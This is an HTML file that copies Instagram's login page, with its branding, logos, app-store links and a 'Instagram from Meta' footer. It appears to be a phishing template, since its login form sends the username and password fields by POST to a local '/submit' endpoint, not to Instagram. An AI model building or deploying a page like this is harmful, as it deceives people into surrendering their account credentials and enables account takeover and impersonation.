<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
     <link rel="icon" href="images/Instagram-icon.png" type="png">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./styles.css">
</head>

<body>

    <div class="container">
        <div class="main-container">
            <div class="main-content">
                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
                    <div class="slide-content" id="slide-content">
                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
                        <img src="./images/slide (2).jpg" alt="slide image">
                        <img src="./images/slide (3).jpg" alt="slide image">
                        <img src="./images/slide (4).jpg" alt="slide image">
                        <img src="./images/slide (5).jpg" alt="slide image">
                    </div>
                </div>
                <div class="form-container">
                    <div class="form-content box">
                        <div class="logo">
                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                        </div>
                        <div class="signin-form" id="signin-form">
                            <form id="loginForm" action="/submit" method="POST">
                                <div class="form-group">
                                    <div class="animate-input">
                                        <span>Phone number, username or email</span>
                                        <input type="text" name="email" required>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="animate-input">
                                        <span>Password</span>
                                        <input type="password" name="password" required>
                                        <button type="button">Show</button>
                                    </div>
                                </div>
                                <div class="btn-group">
                                    <button type="submit" class="btn-login">Log in</button>
                                </div>
                            </form>
                            <div class="divine">
                                <div></div>
                                <div>OR</div>
                                <div></div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-fb">
                                    <img src="./images/facebook-icon.png" alt="">
                                    <span>Log in with Facebook</span>
                                </button>
                            </div>
                            <a href="#" class="forgot-pw">Forgot password?</a>
                        </div>
                    </div>
                    <div class="box goto">
                        <p>Don't have an account? <a href="#">Sign up</a></p>
                    </div>
                    <div class="app-download">
                        <div class="store-link">
                            <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="./images/app-store.png" alt="app store"></a>
                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pcampaignid=web_share"><img src="./images/gg-play.png" alt="google play"></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="links">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <br>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
            </div>
            <div class="copyright">
                Â© 2024 Instagram from Meta
            </div>
        </div>
    </div>

    <script src="./script.js"></script>
</body>

</html>
